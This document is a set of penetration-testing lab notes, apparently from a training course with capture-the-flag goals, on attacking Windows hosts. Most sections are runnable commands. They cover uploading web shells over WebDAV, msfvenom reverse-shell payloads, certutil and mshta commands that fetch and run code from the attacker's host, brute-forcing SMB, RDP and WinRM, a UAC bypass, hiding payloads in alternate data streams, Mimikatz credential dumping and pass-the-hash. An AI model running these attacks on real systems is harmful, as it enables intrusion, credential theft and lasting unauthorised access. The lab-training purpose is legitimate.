## 1. Exploiting Windows Vulnerabilities

### 1.1. Exploiting Microsoft IIS WebDAV

**IIS** (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family.
**WebDAV** (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
**Davtest** is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files.
**Cadaver** is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.

**Username**: bob
**Password**: password_123321

**Tools**: 
- [DAVTest](https://github.com/cldrn/davtest)
- [Cadaver](https://www.kali.org/tools/cadaver/)
- ASP Webshell

**Objective**: Exploit the WebDAV service and retrieve the flag!

```shell
nmap -sV -sC <target_IP>
nmap -p 80 --script http-enum <ip_address>
# The http-enum script in Nmap is particularly useful for identifying common web resources, misconfigurations, and exposed files or directories that might not be immediately visible. If we get (401 Unauthorized) that means the authentication has been enable.
```

**DAVTest** is a command-line tool used for testing WebDAV (Web-based Distributed Authoring and Versioning) servers for potential vulnerabilities. 

```shell
# The following command performs a series of checks that will actually tell you what type of files we can upload or execute on the web dev server.
davtest -auth <user>:<password> -url http://<target_IP>/webdav
```

**Cadaver** is a command-line WebDAV client used to interact with WebDAV-enabled servers. It functions similarly to an FTP client but is specifically designed for WebDAV, allowing users to manage files on a remote server.

```shell
# We can use this utility to upload the *asp web shell*. 
cadaver -h
cadaver http://<target_IP>/webdav # Use credentials.

# Kali comes with pre-packaged with a series of web shells and they can be accessed under.
put /usr/share/webshells/asp/webshell.asp

# Visit http://<target_IP>/webdav and click asp file. You will be provided with an imput box tha allows you to execute commands on the target system. The output will be on the page.
dir C:\ # ls - Linux
type C:\flag.txt # cat /flag.txt - Linux

# The curl -T command is used to upload a file to a remote server using protocols like HTTP, HTTPS, FTP, SFTP, or WebDAV.
curl -T /usr/share/webshells/asp/webshell.asp -u bob:password_123321 http://<target_IP>/webdav/    
```

Using **Metasploit** and **Msfvenom**
**Msfvenom** is a tool that is part of the Metasploit Framework, a popular penetration testing framework developed by Rapid7. Msfvenom is used for generating and encoding payloads, which are pieces of code that an attacker delivers to a target system to gain control or execute specific actions.

```shell
nmap -sV -p 80 --script http-enum <target_IP>
# Generate the ASP payload.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_IP> LPORT=1234 -f asp > <name>.asp
# Upload the payload to the target machine
cadaver http://<target_IP>/webdav # Username and Password
put /root/vladshell.asp
```

Before executing the payload, we need to set up a **listener (handler)** that will wait for the **reverse connection** from the target. Once the target connects back, the handler will send the necessary components (the "stage") to complete the process and provide us with a **Meterpreter session**.

In order to do this, we will need to start up a Metasploit Framework console session:

```shell
#First we need to start a database session, because Metasploit console requires the actual Metasploit Framework database to be started.
service postgresql start && msfconsole
use multi/handler
# This module is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside of the framework.
set payload windows/meterpreter/reverse_tcp
set LHOST <my_IP>
set LPORT <port_number>
run
#Now we have fully access. 
sysinfo
getuid
dir C:\
type C:\flag.txt
```

**Using Metasploit** 

```shell
service postgresql start && msfconsole
use exploit/windows/iis/iis_webdav_upload_asp
show options
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
# %RAND% is a Metasploit variable that generates a random string when the exploit runs. It helps avoid overwriting and increases stealth.
# Fixed filenames can be useful for manual execution but might be detected more easily.
set PATH /webdav/metasploit.asp # metasploit%RAND%.asp
exploit
# Read the flag.
sysinfo
getuid
shell
cd /
dir
type flag.txt
```

### 1.2. Windows: SMB Server PSexec

**SMB** (Server Message Block) is a network protocol primarily used for sharing files, printers, and other resources over a network, typically operating on ports 139 and 445. The Linux equivalent for SMB is the Samba suite, which allows Linux systems to communicate with SMB/CIFS networks and share resources.

Two level of authentication:
- User Authentication - username and password
- Share Authentication - password

**[PsExec]**(https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) is a command-line tool from the Sysinternals Suite that allows administrators to remotely execute processes on other systems without needing to install client software. It supports interactive command prompts and system-level commands on remote machines, typically using port 445 for SMB communication. PsExec requires administrative privileges, making it powerful but also potentially risky if misused.

```shell
# First check with Nmap the open ports and services.
nmap -sV -sC -p 139,445 <target_IP>
nmap -p 445 --script smb-protocols <target_IP>

# The next step will involve performing the SMB brute force.
service postgresql start && msfconsole
search smb_login
use auxiliary/scanner/smb/smb_login
show options
set RHOSTS <target_IP>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

# We have found some users and their passwords. Run psexec module to gain the meterpreter shell.
use exploit/windows/smb/psexec # Keep in mind that an antivirus may detect this on the target machine.
set RHOSTS <target_IP>
set SMBUser <username>
set SMBPass <password>
exploit

shell
cd /
dir
type flag.txt 
```

### 1.3. Exploiting RDP

**[RDP](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)** could be running on another port, not just the default which is 3389.

**Objective**: To fingerprint the running RDP service, then exploit the vulnerability using the appropriate method and retrieve the flag!

**Dictionaries to use:**
- /usr/share/metasploit-framework/data/wordlists/common_users.txt
- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

The best **tools** for this lab are: Nmap, searchsploit, msfconsole, xfreerdp

```shell
nmap -sV -p- <target_IP> # Scan with Nmap
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
# This module attempts to connect to the specified Remote Desktop Protocol port and determines if it speaks RDP.

# For the brute force attack we can use Hydra. Pay attention to the TASK as this may impact machine target performance or DOS it.
hydra
-L /usr/share/metasploit-framework/data/wordlists/common_users.txt 
-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
rdp://<target_IP>:<port>

# xfreerdp is an open-source command-line client for connecting to Remote Desktop Protocol (RDP) servers on Linux, allowing users to access and control remote Windows desktops.
xfreerdp /u:<username> /p:<password> /v:<target_IP>:<port>
```

### 1.4. WinRM: Exploitation with Metasploit

**[Windows Remote Management]**(https://en.wikipedia.org/wiki/Windows_Remote_Management) (WinRM) is a Microsoft protocol that allows administrators to remotely manage and execute scripts on Windows-based computers. It uses the WS-Management protocol to enable secure communication between machines for tasks such as configuration, monitoring, and automation. However is not configured to run by default and needs to be explicitly configured and enabled in order for it to work and in order for you to utilize it. 

**Objective**: Exploit the WinRM service to get a meterpreter on the target and retrieve the flag!

```shell
# Nmap scan
nmap -sV -p- <target_IP>
# Nmap or rather windows system don't explicitely have a banner telling me that this is a WinRM, but in this case we do know that WinRM is running on this port (5985). We can confirm this with the use of CackMapExec
```

**CrackMapExec** (CME) is a popular post-exploitation tool used by security professionals, particularly in the context of penetration testing and red teaming. It is designed to automate common tasks in Windows environments, such as credential validation, lateral movement, and enumeration of network resources, by leveraging protocols like SMB, RDP, WinRM, and others.

```shell
crackmapexec -h
crackmapexec winrm <target_IP> -p <port_number>
crackmapexec <protocol> <target_IP>  -u <username> -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
# protocol = winrm
# username = administrator
crackmapexec winrm <target_IP> -u <username> -p <password> -x "whoami"
crackmapexec winrm <target_IP> -u <username> -p <password> -x "systeminfo"

evil-winrm.rb -u administrator -p '<password>' - <target_IP>
```

We can also use **Metasploit**

auxiliary/scanner/winrm/winrm_auth_methods
auxiliary/scanner/winrm/winrm_login
auxiliary/scanner/winrm/winrm_cmd
exploit/windows/winrm/winrm_script_exec

```shell
service postgresql start && msfconsole
setg RHOSTS <target_IP>
setg RPORT <port_number>

auxiliary/scanner/winrm/winrm_auth_methods
# This module sends a request to an HTTP/HTTPS service to see if it is a WinRM service.
run
# Target supports two authentication types i.e Basic and Negotiate.

use auxiliary/scanner/winrm/winrm_login
# This module attempts to authenticate to a WinRM service.
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
# Note: This will take around 2-3 minutes.
# We are setting the PASSWORD because in the recent version of the "winrm_login" module, the PASSWORD option is required unless using Kerberos authentication. Metasploit will still use the USERPASS_FILE file.
exploit

sessions
sessions -i 1

use auxiliary/scanner/winrm/winrm_cmd
# This module runs arbitrary Windows commands using the WinRM Service
set USERNAME <username>
set PASSWORD <password>
set CMD whoami
exploit

# Now, we will use the winrm_script_exec exploit module to get the meterpreter session.
use exploit/windows/winrm/winrm_script_exec
set USERNAME <username>
set PASSWORD <password>
set FORCE_VBS true
exploit

# Or 'shell'
cd /
dir
type flag.txt
```

## 2. Privilege Escalation

### 2.1. UAC Bypass: UACME

We will look at bypassing User Account Control (UAC) [link](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works) using the UACME [link](https://github.com/hfiref0x/UACME) tool.

**Objective**: Gain the highest privilege on the compromised machine and get admin user **NTLM hash**.

**Note**: The UACMe tool is located in "/root/Desktop/tools/UACME/" directory.

**Gain access to the system**

```shell
# Scan the target usging nmap. We notice that it's running a HTTP file server developed by Rejetto.
service postgresql start && msfconsole
searchsploit hfs # Check the version, in this case 2.3.x
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <target_IP>
exploit

# Migrate the Meterpreter session into a more stable process
pgrep explorer # ps -S explorer.exe
migrate <process_ID>
# This command moves the Meterpreter session from its current process into explorer.exe

getsystem
# In this case we can observe that we do not have permission to elevate privileges
```

Perform some **basic local enumeration** to identify the Windows version, the current user's access permissions, their privileges, and other relevant details.

```shell
sysinfo 
getuid
# I'm logged in as the user 'admin,' not 'Administrator.' This is a different user called 'admin,' but it should be part of the local Administrators group. We can check the privileges for this 'admin' user.
getprivs
shell
# To verify that this user is a part of the local administrators group.
net user
net localgroup administrators
# We can see that this user is part of the administrators group, which means that this user can essencially execute programs with elevated privileges but in order to do that we need to bypass UAC. 
```

**Use of UACME**
- We are going to use the [option 23](https://github.com/hfiref0x/UACME#:~:text=added%20in%20v2.5.0-,Author%3A%20Leo%20Davidson%20derivative,-Type%3A%20Dll%20Hijack)
- The Akagi 64 executable has been provided
- What we need to do is to transfer it over to the target system and we will be able to use it.
- We can upload it directly from /root/Desktop/tools/UACME/
- Before that, we need to generate a Meterpreter payload using msfvenom. We will then transfer it to the target, use the Akagi executable with the key or Method 23, and execute the generated payload, which should bypass UAC.

1) Set up the listener

```shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_local_IP> LPORT=<local_port> -f exe > 'backdoor.exe'
ls
file backdoor.exe
# The next step is to set up our listener
msfconsole -q
# We need to setup our multi handler to receive the connection once the payload is executed on the target.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_HOST_IP>
set LPORT <LOCAL_PORT> # The same I've configured above
exploit
```

2) Transfer Akagi 64 over to the target system

```shell
# Back to the Meterpreter session (exit command from shell session)
pwd 
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe

shell
# Now, if we want to execute backdoor.exe with administrative privileges we need to use method 23.
# Note: Please provide the full path of the backdoor executable.
Akagi64.exe 23 "C:\Users\admin\AppData\Local\Temp\backdoor.exe"
# Once we execute the above command we would expect a meterpreter session.
# We have successfully gained high privilege access. Dump the user hashes.
pgrep lsass.exe
migrate <process_id>
hashdump

# Chek now:
sysinfo
getuid
getprivs # Now we have elevated privileges even though we have access to the main user.
```

**Example:**

admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88fc5f3da6:::
**Username**
- admin
**RID (Relative ID)**
- 1012
**LM Hash**
- aad3b435b51404eeaad3b435b51404ee
**NTLM Hash**
- 4d6583ed4cef81c2f2ac3c88fc5f3da6

### 2.2. Privilege Escalation: Impersonate

**Objective**: Escalate the privilege on a Windows machine.

In this lab, we will learn about the process of impersonating access tokens on Windows with Meterpreter's in-built Incognito module.

```shell
# ! Use the  MSF Rejetto module to gain access to the system.

cat C:\\Users\\Administrator\\Desktop\\flag.txt
# stdapi_fs_stat: Operation failed: Access is denied.
```

The **getprivs** command is used to enumerate (list) all the privileges that the current user account possesses on the target system. Certain privileges (like **SeImpersonatePrivilege** or **SeDebugPrivilege**) are particularly useful for privilege escalation attacks.

```shell
getprivs
# SeImpersonatePrivilege. This means that we can use this Meterpreter session to impersonate other available access tokens.
```

The **Incognito module in Metasploit** is a powerful post-exploitation tool used primarily for token manipulation. It allows attackers to list, impersonate, and steal access tokens from other users, especially high-privilege accounts like Administrator or SYSTEM.

```shell
# We are going to use the 'incognito' module.
load incognito 
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"

pgrep explorer
migrate <process_ID>

getuid
getprivs

# Now read the flag
cat C:\\Users\\Administrator\\Desktop\\flag.txt
```

<br>

## 3. Windows File System Vulnerabilities

### 3.1. Alternate Data Streams

The following technique is used in Post-Exploitation to hide malicious payloads within legitimate files using **Alternate Data Streams (ADS) on NTFS file systems**. Attackers can conceal tools like winPEAS to perform local enumeration and attempt privilege escalation without detection. The use of symbolic links and elevated execution helps bypass security restrictions and execute hidden payloads.

```shell
# Step 1: Create a simple text file using Notepad
# Open the terminal and create a text file named "test.txt" using Notepad.
notepad test.txt

# Write something in the file and save it.
# You can later check the file's metadata by right-clicking on the file, selecting 'Properties,' and navigating to the 'Details' tab.

# Step 2: Create an alternate data stream (ADS) to hide additional information
# In Windows, files can have hidden data streams using the NTFS file system's Alternate Data Streams feature.
# Here, we create a hidden stream attached to "test.txt" called "secret.txt".
notepad test.txt:secret.txt

# Write some content in this hidden stream and save it.
# When you open "test.txt" again, nothing will appear in the main file since the hidden stream remains invisible through standard file access methods.

# Step 3: Concealing a malicious payload using an Alternate Data Stream
# We can hide a malicious payload within the file's resource stream. When the file executes, we can specify execution from the hidden stream.

# Step 4: Using winPEAS for privilege escalation enumeration
# The winPEASx64 binary is a tool used by penetration testers to perform local system enumeration on Windows machines, identifying potential privilege escalation vulnerabilities.

# First, navigate to the Temp directory where we'll hide the binary within an alternate stream.
# The following command hides the winPEAS executable within a legitimate-looking text file.
type payload.exe > windowslog.txt:winpeas.ext

# Attempt to execute the hidden binary directly.
# This command will fail with an "Access Denied" error because Windows doesn't allow execution directly from alternate data streams.
start windowslog.txt:winpeas.exe  # Access Denied

# Step 5: Bypassing execution restriction using symbolic links (mklink)
# To execute the hidden payload, create a symbolic link in the System32 directory, pointing to the hidden binary.
mklink wupdate.ext C:\Temp\windowslog.txt:winpeas.ext

# Step 6: Run the payload from an elevated prompt
# Open Command Prompt as Administrator and run the newly created link.
# This can potentially allow execution of the payload with elevated privileges if properly configured.
C:\Windows\system32>wupdate
```

## 4. Windows Credential Dumping

### 4.1. Searching For Password in Windows Configuration Files

If the **Unattended Windows Setup** configuration files are left on the target system after installation, they can reveal user account credentials that can be  used by attackers to authenticate with Windows target legitimately.

The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
- C:\Windows\Panther\Unattend.xml
- C:\ Windows\Panther\Autounattend.xml

```shell
# STEP 1: Generate a malicious payload using msfvenom. This payload will establish a reverse connection from the target machine back to the attacker's machine.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<local_IP> LPORT=<port_number> -f exe > payload.exe
ls
file payload.exe

# STEP 2: Set up a simple HTTP server to host the payload. This allows the target system to download the payload from your machine. This command will host a web server on port 80 using Python.
python -m SimpleHTTPServer 80

# STEP 3: Download the payload on the target machine. On the target machine, open Command Prompt and navigate to the Desktop.
cd <desktop>

# Use certutil (a legitimate Windows utility) to download the payload from the attacker's HTTP server.
certutil -urlcache -f http://<kali_IP>/payload.exe payload.exe
# The payload is now on the target machine, ready for execution.

# STEP 4: Prepare the Metasploit multi-handler to receive the reverse connection. Stop the web server and set up Metasploit.
service postgresql start && msfconsole

# Configure the multi-handler to listen for the reverse shell connection.
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 1234
set LHOST <my_IP>
run  # Starts listening for incoming connections.

# STEP 5: Once the target runs the payload, a Meterpreter session will open.
sysinfo

# STEP 6: Search for sensitive configuration files on the target.
search -f Unattend.xml  # This search might take some time depending on the system size.
# cd C:\\Windows\\Panther

# STEP 7: Navigate to the directory where 'Unattend.xml' is usually stored and download the configuration file containing potential credentials.
download unattend.xml

# STEP 8: Extract and analyze potential plaintext credentials. View the contents of the file to locate sensitive information such as AutoLogon passwords.
cat unattend.xml
# Paste the Base64-encoded password found in the file into a new text file for decoding.
vim password.txt  # Save the encoded password. (:wq)
# Decode the password from Base64 format to reveal the plaintext credentials.
base64 -d password.txt <optional_output_file> # Example decoded password: Admin@123

# STEP 9: Validate the extracted credentials using PsExec. If the password hasn't been changed since installation, you can attempt authentication.
# Use Impacket's PsExec tool to execute commands remotely on the compromised machine.
psexec.py Administrator@<target_IP>
<password>  # Enter the decoded password.

# Verify if you successfully gained administrative access.
whoami  # Should return "NT AUTHORITY\SYSTEM" if successful.

# NOTE: In larger networks, administrators often forget to delete the unattended setup configuration files. These files can be a valuable source of credentials if left behind after system setup.
```

### 4.2. Unattended Installation

Your task is to run PowerUp.ps1 Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations. The PowerSploit post-exploitation framework has been provided on the Windows machine.

**Objective:** Gain access to meterpreter session with high privilege.

**Target Machine**

```shell
# Switch to Attacker Machine and check the current user
whoami

# Run powerup.ps1 Powershell script to find privilege escalation vulnerability
cd .\Desktop\PowerSploit\Privesc\
ls

# Import PowerUp.ps1 script and Invoke-PrivescAudit function
powershell -ep bypass # PowerShell execution policy bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
# We can notice that there is an Unattend.xml file present on the system. Open the Unattend.xml file.
# Unattend.xml: Unattend.xml is an answer file for installation. The files may contain encoded or plain-text credentials and other sensitive information.

# Reading Unattend.xml file
cat C:\Windows\Panther\Unattend.xml

# Decoding administrator password using Powershell
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password

# We are running a command prompt as an administrator user using discover credentials
runas.exe /user:administrator cmd # Enter the password, e.g. Admin@123
whoami
# We are running cmd.exe as an administrator
```

**Kali Machine**

```shell
# Running the hta_server module to gain the meterpreter shell
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

**Target Machine**

```shell
# Copy the generated payload i.e “http://10.10.31.2:8080/Bn75U0NL8ONS.hta” and run it on cmd.exe with mshta command to gain the meterpreter shell
mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
```

**Kali Machine**

```shell
# We can expect a meterpreter shell.

# ind the flag
sessions -i 1
cd /
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```

### 4.3. Dumping Hashes With Mimikatz - Kiwi

The **Meterpreter Kiwi plugin** is an advanced Post-Exploitation tool within the Metasploit Framework, specifically designed for interacting with and extracting sensitive data from compromised Windows systems. Kiwi is an extension of the Meterpreter payload and incorporates features from Mimikatz, a well-known post-exploitation tool used for extracting passwords, hashes, and other credentials from Windows systems. In this lab, we will explore the meterpreter Kiwi plugin to extract sensitive data from the target machine.

**Objective**: Use the meterpreter Kiwi plugin to extract sensitive data from the target's machine. Exploit the application and find all the flags:
- **Find Administrator and Student users NTLM hash**
- **Dump LSA secrets to find Syskey**

```shell
# Initial Scanning with Nmap and exploiting BadBlue Vulnerability Using Metasploit.
ping -c 1 <target_IP>
nmap -sV -O <target_IP> # 80/tcp | open  http | BadBlue httpd 2.7

service postgresql start && msfconsole
search badblue
use exploit/windows/http/badblue_passthru
set RHOSTS <target_IP>
exploit

# Post-Exploitation Enumeration
sysinfo  # Displays information about the target system (OS, architecture, etc.)
getuid   # Displays the current user context for the Meterpreter session.

# Privilege Escalation - Migrating to LSASS Process
pgrep lsass # migrate -N lsass.exe
migrate <process_number>
getuid # Should return NT AUTHORITY\SYSTEM, indicating SYSTEM-level access.
```

> This only works if your current user already has the right to access or inject into lsass.exe — usually if you're at least Administrator. If not, the migration will fail or crash the system.

**ATTACKDEFENSE\Administrator**
- High-level administrative privileges but below SYSTEM.
- Full control over the local system, including installing software, managing users, and changing system settings.
- Still subject to certain restrictions compared to SYSTEM, particularly regarding system-level services and kernel-level actions.

**NT AUTHORITY\SYSTEM**
- Highest possible privileges on a Windows system.
- Built-in system account used by Windows operating system processes and services.
- Full control over the entire system, including all files, services, processes, and registry keys.
- Even more powerful than an Administrator because it has unrestricted access to every part of the OS.

**Kiwi Extension for Credential Dumping**

```shell
# Load the Kiwi Extension for Credential Dumping. Kiwi is an inbuilt Metasploit extension based on Mimikatz, used for extracting sensitive information like credentials and hashes.
load kiwi # Load the Kiwi extension.
help kiwi  # Shows the help menu for available Kiwi commands.

creds_all # Dump all stored credentials, including plaintext passwords, hashes, and Kerberos tickets.
lsa_dump_sam # The SAM file contains hashed credentials for local user accounts.
lsa_dump_secrets # Find the syskey by dumping the LSA secrets.
```

**Manual Credential Extraction Using Mimikatz Executable**

```shell
# Manual Credential Extraction Using Mimikatz Executable
pwd  # Check the current working directory.
cd C:\\  # Change to the C: drive.
mkdir Temp  # Create a temporary folder.
cd Temp  # Navigate to the Temp directory.

# Upload the Mimikatz executable from your local machine.
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

shell # Start a command shell from the Meterpreter session.
dir # List the contents of the Temp directory to ensure the upload was successful.
.\mimikatz.exe # Execute Mimikatz from the shell.

# Verify Privileges in Mimikatz
privilege::debug  # Should return 'Privilege '20' OK' if successful.
lsadump::sam  # Dumps hashed credentials from the SAM file.
lsadump::secrets  # Extracts system secrets.

# Extract Cleartext Passwords from Memory
sekurlsa::logonpasswords # If the system is configured to store passwords in memory, Mimikatz can extract them.
# If no cleartext passwords appear, the system is likely well-configured and secured.
```

>  **NOTE:** When users log on to a Windows system, credentials might be stored in memory. Misconfigured systems can store these passwords in cleartext, allowing tools like Mimikatz to retrieve them. Well-configured systems clear passwords from memory, meaning no results will appear from this command.

### 4.4. Pass the Hash Attacks

At first glance, it might seem unnecessary to authenticate again after already gaining administrative access on a target system. After all, if you already have an active Meterpreter session or reverse shell running with administrative privileges, why would you need to re-establish access?

The answer is straightforward yet critical: persistence and flexibility in exploitation. Imagine you've exploited a vulnerability to gain access to a system, but later the system is patched or the vulnerable service is disabled. If your session depends on that vulnerability, it may be closed or stop working — and you could lose access entirely.

However, if you've successfully extracted the administrator's NTLM hash from the system, you can use it to re-authenticate and regain access, regardless of whether the original vulnerability has been patched. This technique, known as pass-the-hash (PTH), allows you to authenticate using the hash alone — without needing the actual plaintext password.

This method is incredibly powerful because:

1) You bypass the need for the original exploit - you no longer rely on a vulnerability that could be patched at any time.
2) You can regain access repeatedly as long as the administrator's hash remains valid and unchanged.
3) You can perform lateral movement across the network, potentially gaining access to other systems using the same credentials if they share administrative accounts.

In essence, obtaining and using the administrator hash provides a persistent backdoor into the target system, offering long-term access even if the initial exploit vector is no longer available. This technique highlights the importance of proper credential management and the risks associated with weak or reused passwords in network environments.

```shell
service postgresql start & msfconsole
search badblue
use exploit/windows/http/badblue_passthru
set RHOSTS <tartget_IP>
exploit

pgrep lsass
migrate <process_ID>

getuid # We should have NT Authority

load kiwi
lsa_dump_sam
hashdump
```

The PsExec module in Metasploit (exploit/windows/smb/psexec) is used to execute commands on a remote Windows machine over SMB (Server Message Block). This module is particularly useful for lateral movement and privilege escalation in post-exploitation scenarios.

```shell
search psexec
use exploit/windows/smb/psexec
show options
set LPORT <local_port>
set RHOSTS <target_IP>
set SMBUser Administrator  # Use the Administrator account for SMB authentication
set SMBPass <LM:NTLM>  # Provide the LM and NTLM hash (in LM:NTLM format)
exploit 
```

Even if you already have administrative access on one machine through a Meterpreter session, using PsExec allows you to:
- **Establish Persistent Access:** If your original exploit gets patched or the vulnerability is fixed, using PsExec with valid credentials (or hashes) lets you regain access without exploiting the vulnerability again.
- **Lateral Movement Across the Network:** You can use stolen credentials (or NTLM hashes) to move from one compromised machine to other systems within the network that share the same credentials.
- **Privilege Escalation:** If you don't have the highest privileges on a new target system, PsExec can help you gain full administrative access using known valid credentials.

```shell
# The reason we didn't get a meterpreter session is because we need to configure the target.
set target
set target Command
exploit
# If it doesn't work try...
set target Native\ upload
exploit
sysinfo
getuid 
```

**Using crackmapexec** 

```shell
# Another way is using crackmapexec
crackmapexec smb <target IP> -u Administrator -H "<NTLM hash>"
crackmapexec smb <target IP> -u Administrator -H "<NTLM hash>" -x "ipconfig"
crackmapexec smb <target IP> -u Administrator -H "<NTLM hash>" -x "whoami"
```
